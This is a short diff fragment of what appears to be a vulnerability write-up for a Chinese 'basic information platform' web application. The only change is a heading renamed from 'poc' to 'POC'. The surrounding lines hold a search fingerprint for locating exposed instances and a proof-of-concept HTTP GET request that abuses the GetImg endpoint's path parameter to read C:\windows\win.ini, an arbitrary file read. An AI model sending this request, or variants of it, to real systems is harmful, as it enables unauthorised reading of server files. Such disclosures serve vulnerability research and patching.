@@ -8,7 +8,7 @@
 body="/SystemManage/BaseProject" || title=="基础信息平台"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /SystemManage/BaseProject/GetImg?path=C:\windows\win.ini HTTP/1.1
